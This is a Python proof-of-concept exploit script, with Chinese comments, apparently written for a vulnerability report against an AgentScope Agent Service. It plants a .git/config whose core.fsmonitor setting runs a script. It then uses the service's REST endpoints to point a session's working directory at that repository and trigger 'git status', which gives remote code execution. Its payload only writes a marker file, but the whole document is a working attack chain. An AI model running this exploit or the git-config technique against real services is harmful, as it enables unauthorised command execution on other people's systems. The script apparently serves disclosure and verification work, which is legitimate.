# -*- coding: utf-8 -*-
"""AS-2026-005 子进程/命令调用面（git 配置驱动 RCE）
— real service REST exp（与 exp_real_cli.py 的真实 CLI 链互补）

真实部署：未经改动的 AgentScope Agent Service（无 /fuzz/probe）。

真实服务侧同类链（全部为真实 REST）：
  POST /agent → POST /sessions → POST /workspace/skill/upload
    （上传含恶意 .git/config 的"技能"，validate_manifest 不拦 `.git`）
  → PATCH /sessions/{id} {cwd: <技能目录>}（cwd 文档明示"不局限于
    workspace 根"）
  → GET /workspace/status → WorkspaceService._read_git
    → backend.exec_shell("git status …", cwd=cwd)
    → git 读取该目录 .git/config 的 core.fsmonitor → 命令执行。

注：报告 sink `_assert_pristine`（scripts/issue_triage.py）的**真实
CLI** 利用链见同目录 exp_real_cli.py。
"""
import json
import os
import stat
import subprocess
import sys
import time

import requests

sys.path.insert(0, os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "agentscope-common"))
from realapi import jreq  # noqa: E402

BASE = "http://127.0.0.1:8001"
HDR = {"X-User-Id": "exp-user"}
TMP = os.path.join(os.environ.get("TEMP", "/tmp"), "as_realapi_git_rce")
MARKER = os.path.join(TMP, "RCE_MARKER.txt")
PY = sys.executable


def make_payload_repo():
    if os.path.exists(TMP):
        for root, dirs, files in os.walk(TMP, topdown=False):
            for f in files:
                try:
                    os.chmod(os.path.join(root, f), stat.S_IWRITE)
                except Exception:
                    pass
                os.remove(os.path.join(root, f))
            for d in dirs:
                os.rmdir(os.path.join(root, d))
        os.rmdir(TMP)
    os.makedirs(os.path.join(TMP, ".git"))
    os.makedirs(os.path.join(TMP, ".git", "objects"), exist_ok=True)
    os.makedirs(os.path.join(TMP, ".git", "refs"), exist_ok=True)

    # 载荷：写 marker
    payload_src = (
        "import datetime\n"
        "open({!r}, 'a').write('RCE ' + str(datetime.datetime.now()) + '\\n')\n"
    ).format(MARKER)
    with open(os.path.join(TMP, "payload.py"), "w", encoding="utf-8") as f:
        f.write(payload_src)

    # 恶意 git 配置：core.fsmonitor 钩子（git status 即执行 payload.py）
    config_src = (
        "[core]\n"
        "\trepositoryformatversion = 0\n"
        "\tfilemode = true\n"
        "\tbare = false\n"
        "\tfsmonitor = \"{py}\" payload.py\n"
    ).format(py=PY.replace("\\", "/"))
    with open(os.path.join(TMP, ".git", "config"), "w", encoding="utf-8") as f:
        f.write(config_src)

    with open(os.path.join(TMP, ".git", "HEAD"), "w") as f:
        f.write("ref: refs/heads/main\n")
    return TMP


def main():
    repo = make_payload_repo()
    print("[setup] malicious repo:", repo)

    # 1) 真实 API：agent + session
    code, agent = jreq("POST", "/agent/", {"name": "exp-git-agent"})
    assert code in (200, 201), agent
    agent_id = agent["agent_id"]
    code, sess = jreq("POST", "/sessions/", {"agent_id": agent_id})
    assert code in (200, 201), sess
    session_id = sess["session_id"]
    print("[POST /agent, /sessions]", agent_id, session_id)

    # 2) 真实 API：把 session 的 cwd 指到恶意仓库（文档明示不局限于
    #    workspace 根——这正是攻击者可经 PATCH 控制的 git 工作目录）
    code, resp = jreq(
        "PATCH",
        "/sessions/" + session_id + "?agent_id=" + agent_id,
        {"cwd": repo},
    )
    print("[PATCH /sessions/%s] cwd=malicious-repo ->" % session_id,
          code, resp if isinstance(resp, str) else "(ok)")

    # 3) 真实 API 触发 git：GET /workspace/status
    #    → _read_git(backend, cwd) → exec_shell(git status, cwd=repo)
    if os.path.exists(MARKER):
        os.remove(MARKER)
    t0 = time.time()
    code, resp = jreq(
        "GET",
        "/workspace/status?agent_id=%s&session_id=%s" % (agent_id, session_id),
    )
    print("[GET /workspace/status] ->", code)
    if isinstance(resp, dict):
        git = resp.get("git")
        print("[status] workdir=%s git=%s" % (resp.get("cwd"), git))

    time.sleep(2)
    ok = os.path.exists(MARKER)
    if ok:
        print("[evidence] marker:", open(MARKER).read().strip())
    print()
    print("[VERDICT] GIT_CONFIG_RCE_VIA_REAL_REST =", ok)
    print("[VERDICT] TRIGGER_ENDPOINT = GET /workspace/status")
    print("[VERDICT] ENTRY_CWD_PARAM = PATCH /sessions/%s {cwd}" % session_id)
    print("[VERDICT] EXP_SUCCESS =", ok)


if __name__ == "__main__":
    main()
